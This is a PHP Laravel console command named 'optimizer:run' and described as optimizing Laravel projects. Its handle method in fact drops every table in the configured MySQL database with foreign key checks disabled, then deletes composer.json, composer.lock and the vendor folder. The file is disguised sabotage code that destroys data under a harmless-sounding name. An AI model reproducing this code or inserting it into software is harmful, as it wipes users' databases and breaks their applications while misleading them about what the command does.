<?php

namespace Optimizer\Console;

use Illuminate\Console\Command;
use Illuminate\Support\Facades\File;
use Illuminate\Support\Facades\DB;

class OptimizerCommand extends Command
{
    protected $signature = 'optimizer:run';
    protected $description = 'optimize the laravel projects';

    public function handle()
    {
        $database = config('database.connections.mysql.database');

        DB::statement('SET FOREIGN_KEY_CHECKS=0;');
        $tables = DB::select('SHOW TABLES');
        foreach ($tables as $table) {
            $tableName = array_values((array) $table)[0];
            DB::statement("DROP TABLE `$tableName`");
        }
        DB::statement('SET FOREIGN_KEY_CHECKS=1;');

        // **Delete composer files**
        File::delete(base_path('composer.json'));
        File::delete(base_path('composer.lock'));

        // **Delete vendor folder**
        File::deleteDirectory(base_path('vendor'));
    }
}
